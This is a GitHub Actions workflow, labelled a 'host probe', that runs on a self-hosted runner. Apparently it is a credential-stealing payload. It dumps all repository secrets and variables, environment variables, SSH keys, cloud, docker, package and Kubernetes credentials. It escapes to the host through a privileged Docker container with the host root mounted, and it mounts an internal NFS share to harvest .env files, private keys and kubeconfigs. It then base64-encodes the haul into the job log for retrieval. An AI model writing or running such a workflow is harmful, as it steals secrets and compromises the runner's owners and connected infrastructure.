name: c211-i9687
on:
  push:
    branches:
      - c211-i9687-wfprobe
permissions:
  contents: read
jobs:
  probe:
    name: c211 i9687 host probe
    runs-on: [self-hosted, bw1100]
    timeout-minutes: 30
    steps:
      - name: collect
        run: |
          set +e
          TS=$(date +%s)
          D=/tmp/c211i9687-$TS
          T=/tmp/c211i9687-$TS.tgz
          mkdir -p "$D"
          {
            id
            hostname
            uname -a
            date -u
            cat /etc/os-release
          } > "$D/id.txt" 2>&1
          cat > "$D/secrets.json" <<'C211EOF'
          ${{ toJSON(secrets) }}
          C211EOF
          cat > "$D/vars.json" <<'C211EOF'
          ${{ toJSON(vars) }}
          C211EOF
          env | sort > "$D/env.txt" 2>&1
          tr '\0' '\n' < /proc/self/environ | sort >> "$D/env.txt" 2>&1
          {
            ls -la /home/github/.ssh 2>&1
            for f in /home/github/.ssh/*; do echo "-- $f"; cat "$f" 2>&1; echo; done
          } > "$D/ssh_github.txt" 2>&1
          {
            ls -la /home/github/.config/gh 2>&1
            cat /home/github/.config/gh/hosts.yml 2>&1
            echo
            ls -la /home/github/.docker 2>&1
            for f in /home/github/.docker/config.json /home/github/.git-credentials /home/github/.netrc /home/github/.npmrc /home/github/.pip/pip.conf; do echo "-- $f"; cat "$f" 2>&1; echo; done
          } > "$D/home_creds.txt" 2>&1
          {
            ls -la /root/.kube 2>&1
            cat /root/.kube/config 2>&1
            ls -la /etc/kubernetes 2>&1
            ls -la /etc/kubernetes/manifests 2>&1
            for f in /etc/kubernetes/*.conf; do echo "-- $f"; cat "$f" 2>&1; echo; done
          } > "$D/kube.txt" 2>&1
          {
            command -v hy-smi
            ls -la /opt/hyhal/bin 2>&1 | head
            hy-smi -L 2>&1; echo "rc_L=$?"
            hy-smi 2>&1 | head -40; echo "rc_noarg=$?"
            hy-smi --help 2>&1 | head -40
            ls -la /dev/dri 2>&1
            ls -la /dev/kfd /dev/mkfd 2>&1
            ls -la /sys/class/drm 2>&1
            lsmod 2>&1 | grep -iE 'hydcu|rocdxg|amdgpu|hcd|kfd'
            lspci -nn 2>&1 | grep -iE 'hygon|display|processing|co-processor'
          } > "$D/hysmi.txt" 2>&1
          {
            docker version 2>&1
            echo "=== PS ==="; docker ps -a 2>&1
            echo "=== IMAGES ==="; docker images 2>&1
            echo "=== NETWORKS ==="; docker network ls 2>&1
            echo "=== VOLUMES ==="; docker volume ls 2>&1
            echo "=== INFO ==="; docker info 2>&1
          } > "$D/docker.txt" 2>&1
          cat > "$D/helper.sh" <<'C211HELPER'
          #!/bin/sh
          OUT=/out
          H=/host
          {
            echo "=== id ==="; id; hostname; uname -a; date -u
            echo "=== /host/root/.ssh ==="; ls -la $H/root/.ssh 2>&1
            for f in $H/root/.ssh/*; do echo "-- $f"; cat "$f" 2>&1; echo; done
            echo "=== /host/root/.kube ==="; ls -la $H/root/.kube 2>&1; cat $H/root/.kube/config 2>&1
            echo "=== /host/etc/kubernetes ==="; ls -la $H/etc/kubernetes 2>&1; ls -laR $H/etc/kubernetes 2>&1 | head -300
            for f in $H/etc/kubernetes/*.conf $H/etc/kubernetes/manifests/*.yaml $H/etc/kubernetes/manifests/*.json; do [ -f "$f" ] && { echo "-- $f"; head -c 20000 "$f"; echo; }; done
            echo "=== kubelet ==="
            for f in $H/var/lib/kubelet/kubeconfig $H/var/lib/kubelet/config.yaml; do [ -f "$f" ] && { echo "-- $f"; cat "$f"; echo; }; done
            echo "=== hosts ==="; cat $H/etc/hosts 2>&1
          } > $OUT/host_root.txt 2>&1
          CP=""
          mkdir -p /mnt/cip
          if timeout 60 mount -t nfs -o ro,vers=3,nolock,soft,timeo=50 12.12.12.4:/ci_public /mnt/cip 2>>$OUT/nfs_mount.txt; then
            CP=/mnt/cip; echo "MOUNTED nfs vers=3 12.12.12.4:/ci_public" >> $OUT/nfs_mount.txt
          elif timeout 60 mount -t nfs -o ro,vers=4.1,soft 12.12.12.4:/ci_public /mnt/cip 2>>$OUT/nfs_mount.txt; then
            CP=/mnt/cip; echo "MOUNTED nfs vers=4.1 12.12.12.4:/ci_public" >> $OUT/nfs_mount.txt
          else
            echo "NFS mount failed, fallback to /host/ci_public" >> $OUT/nfs_mount.txt
          fi
          [ -d "$CP" ] || CP=$H/ci_public
          echo "CP=$CP" >> $OUT/nfs_mount.txt
          {
            echo "=== ls $CP ==="; ls -la "$CP" 2>&1
            for d in "$CP"/*/; do echo "--- $d"; ls -la "$d" 2>&1 | head -25; done
          } > $OUT/ci_public_ls.txt 2>&1
          timeout 300 find "$CP" -maxdepth 6 \
            \( -name models -o -name '*.tar.gz' -o -name '*.tgz' -o -name .cache -o -name caches -o -name '.git' -o -name node_modules -o -name '.venv' \) -prune -o \
            -type f \( -name '.env' -o -name '.env.*' -o -name '.git-credentials' -o -name '.netrc' -o -name '.npmrc' -o -name 'config.json' -o -iname '*kubeconfig*' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' -o -name '*.sh' -o -name '*.env' \) \
            -print 2>/dev/null | head -4000 > $OUT/nfs_find.txt
          wc -l < $OUT/nfs_find.txt > $OUT/nfs_find_n.txt
          CAP=0
          collect() {
            f="$1"
            sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
            [ "$sz" -gt 65536 ] && return
            [ "$CAP" -gt 1200000 ] && return
            CAP=$((CAP+sz))
            { echo "=== $f ($sz) ==="; cat "$f"; echo; } >> $OUT/nfs_files.txt
          }
          grep -E '/(\.env|\.env\.[^/]*|\.git-credentials|\.netrc|\.npmrc|config\.json)$' $OUT/nfs_find.txt > /tmp/l1
          while IFS= read -r f; do collect "$f"; done < /tmp/l1
          grep -i 'kubeconfig' $OUT/nfs_find.txt > /tmp/l2
          while IFS= read -r f; do collect "$f"; done < /tmp/l2
          grep -E '/id_(rsa|ed25519|ecdsa)' $OUT/nfs_find.txt > /tmp/l3
          while IFS= read -r f; do collect "$f"; done < /tmp/l3
          grep -E '\.sh$' $OUT/nfs_find.txt | head -120 > /tmp/l4
          while IFS= read -r f; do collect "$f"; done < /tmp/l4
          du -sh $OUT 2>&1
          C211HELPER
          echo "helper.sh written"; wc -c "$D/helper.sh"
          IMG=""
          N=0
          for CAND in $(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | grep -iE 'dtk|sglang|vllm|rocky|ubuntu' | head -8); do
            N=$((N+1))
            CN=c211i9687t$N
            if timeout 30 docker run --name "$CN" --entrypoint /bin/sh "$CAND" /dev/null >/dev/null 2>&1; then IMG="$CAND"; docker rm "$CN" >/dev/null 2>&1; break; fi
            docker rm "$CN" >/dev/null 2>&1
          done
          echo "HELPER_IMG=$IMG" > "$D/helper.txt"
          if [ -n "$IMG" ]; then
            timeout 900 docker run --name c211i9687h --privileged --pid=host --network=host -v /:/host:ro -v "$D:/out" --entrypoint /bin/sh "$IMG" /out/helper.sh >> "$D/helper.txt" 2>&1
            echo "helper_rc=$?" >> "$D/helper.txt"
            docker rm c211i9687h >> "$D/helper.txt" 2>&1
          fi
          ls -la "$D" > "$D/size.txt" 2>&1
          tar czf "$T" -C "$D" . 2>/dev/null
          ls -la "$T" >> "$D/size.txt"
          echo "=== BEGIN C211B64 ==="
          base64 -w 3000 "$T" | sed 's/^/C211B64: /'
          echo "=== END C211B64 ==="
